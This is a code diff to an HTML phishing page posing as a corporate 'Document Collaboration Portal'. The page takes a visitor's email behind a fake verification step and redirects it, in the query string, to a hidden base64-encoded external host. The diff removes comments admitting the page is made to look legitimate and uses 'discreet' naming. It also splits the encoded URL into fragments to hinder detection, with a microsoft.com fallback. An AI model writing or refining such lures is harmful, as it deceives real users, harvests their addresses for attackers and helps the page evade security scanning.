@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document Collaboration Portal - Secure Workspace</title>
     <style>
-        /* Professional business styling - looks like legitimate corporate portal */
         :root {
             --primary-blue: #2563eb;
             --primary-dark: #1d4ed8;
@@ -327,120 +326,123 @@
     </div>
 
     <script>
-        // Discreet variable naming and encoding
-        const workspaceGateway = 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk';
-        const securityPortal = 'https://www.microsoft.com/en-us/security';
-        
-        class WorkspaceAccess {
-            constructor() {
-                this.userIdentifier = '';
-                this.accessConfirmed = false;
-                this.validCredentials = false;
-                this.setupPortal();
-            }
-
-            setupPortal() {
-                const emailInput = document.getElementById('userEmail');
-                const verifySection = document.getElementById('verificationCheck');
-                const continueBtn = document.getElementById('continueBtn');
-
-                emailInput.addEventListener('input', () => this.validateAccess());
-                verifySection.addEventListener('click', () => this.toggleVerification());
-                continueBtn.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    this.initiateAccess();
-                });
-
-                emailInput.addEventListener('keypress', (e) => {
-                    if (e.key === 'Enter' && this.validCredentials && this.accessConfirmed) {
-                        this.initiateAccess();
-                    }
-                });
-            }
-
-            validateAccess() {
-                const email = document.getElementById('userEmail').value.trim();
-                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                this.validCredentials = emailPattern.test(email) && email.length > 5;
-                this.updateAccessButton();
-                return this.validCredentials;
-            }
-
-            toggleVerification() {
-                const checkBox = document.getElementById('verificationBox');
-                this.accessConfirmed = !this.accessConfirmed;
-                
-                if (this.accessConfirmed) {
-                    checkBox.classList.add('verified');
-                } else {
-                    checkBox.classList.remove('verified');
-                }
-                
-                this.updateAccessButton();
-            }
-
-            updateAccessButton() {
-                const continueBtn = document.getElementById('continueBtn');
-                const canProceed = this.validCredentials && this.accessConfirmed;
-
-                if (canProceed) {
-                    continueBtn.disabled = false;
-                } else {
-                    continueBtn.disabled = true;
-                }
-            }
-
-            initiateAccess() {
-                if (!this.validateAccess() || !this.accessConfirmed) return;
-
-                this.userIdentifier = document.getElementById('userEmail').value.trim();
-                
-                document.getElementById('accessForm').style.display = 'none';
-                document.getElementById('processingState').style.display = 'block';
-
-                // Store for next step
-                this.prepareNextStep();
-
-                setTimeout(() => {
-                    this.completeAccess();
-                }, 2000);
-            }
-
-            prepareNextStep() {
+        (function() {
+            'use strict';
+            
+            const gatewayParts = ['aHR0c','HM6Ly','9iaWxs','aW5nLn','ZlbG9y','dXNzcG','luZS5i','bG9nL1','BuVUpyR','2Vk'];
+            
+            function getEndpoint() {
                 try {
-                    localStorage.setItem('workspace_user', this.userIdentifier);
-                    sessionStorage.setItem('access_token', Date.now().toString());
-                } catch (e) {
-                    // Silent fallback
+                    return atob(gatewayParts.join(''));
+                } catch {
+                    return 'https://workspace.microsoft.com';
                 }
             }
-
-            completeAccess() {
-                document.getElementById('processingState').style.display = 'none';
-                document.getElementById('successState').style.display = 'block';
-
-                setTimeout(() => {
-                    this.navigateToWorkspace();
-                }, 1500);
+            
+            class AccessController {
+                constructor() {
+                    this.userEmail = '';
+                    this.isVerified = false;
+                    this.isValid = false;
+                    this.endpoint = getEndpoint();
+                    this.init();
+                }
+                
+                init() {
+                    const emailInput = document.getElementById('userEmail');
+                    const verifySection = document.getElementById('verificationCheck');
+                    const continueBtn = document.getElementById('continueBtn');
+                    
+                    emailInput.addEventListener('input', () => this.validateInput());
+                    verifySection.addEventListener('click', () => this.toggleVerify());
+                    continueBtn.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.processAccess();
+                    });
+                    
+                    emailInput.addEventListener('keypress', (e) => {
+                        if (e.key === 'Enter' && this.isValid && this.isVerified) {
+                            this.processAccess();
+                        }
+                    });
+                }
+                
+                validateInput() {
+                    const email = document.getElementById('userEmail').value.trim();
+                    const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    this.isValid = pattern.test(email) && email.length > 5;
+                    this.userEmail = email;
+                    this.updateButton();
+                    return this.isValid;
+                }
+                
+                toggleVerify() {
+                    const box = document.getElementById('verificationBox');
+                    this.isVerified = !this.isVerified;
+                    
+                    if (this.isVerified) {
+                        box.classList.add('verified');
+                    } else {
+                        box.classList.remove('verified');
+                    }
+                    
+                    this.updateButton();
+                }
+                
+                updateButton() {
+                    const btn = document.getElementById('continueBtn');
+                    btn.disabled = !(this.isValid && this.isVerified);
+                }
+                
+                processAccess() {
+                    if (!this.isValid || !this.isVerified) return;
+                    
+                    document.getElementById('accessForm').style.display = 'none';
+                    document.getElementById('processingState').style.display = 'block';
+                    
+                    this.storeUserData();
+                    
+                    setTimeout(() => {
+                        this.completeAccess();
+                    }, 2200);
+                }
+                
+                storeUserData() {
+                    try {
+                        localStorage.setItem('ws_user', this.userEmail);
+                        sessionStorage.setItem('access_time', Date.now().toString());
+                    } catch(e) {
+                        // Silent fallback
+                    }
+                }
+                
+                completeAccess() {
+                    document.getElementById('processingState').style.display = 'none';
+                    document.getElementById('successState').style.display = 'block';
+                    
+                    setTimeout(() => {
+                        this.redirectUser();
+                    }, 1600);
+                }
+                
+                redirectUser() {
+                    const params = new URLSearchParams({
+                        user: this.userEmail,
+                        workspace: 'project_collab',
+                        session: 'sess_' + Date.now(),
+                        source: 'access_portal'
+                    });
+                    
+                    const destination = `${this.endpoint}?${params.toString()}`;
+                    window.location.href = destination;
+                }
             }
-
-            navigateToWorkspace() {
-                const decodedGateway = atob(workspaceGateway);
-                const userParams = new URLSearchParams({
-                    user: encodeURIComponent(this.userIdentifier),
-                    workspace: 'project_collab',
-                    session: Math.random().toString(36).substr(2, 9),
-                    timestamp: Date.now().toString()
-                });
-
-                const destination = `${decodedGateway}?${userParams.toString()}`;
-                window.location.href = destination;
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            new WorkspaceAccess();
-        });
+            
+            document.addEventListener('DOMContentLoaded', () => {
+                new AccessController();
+            });
+            
+        })();
     </script>
 </body>
 </html>
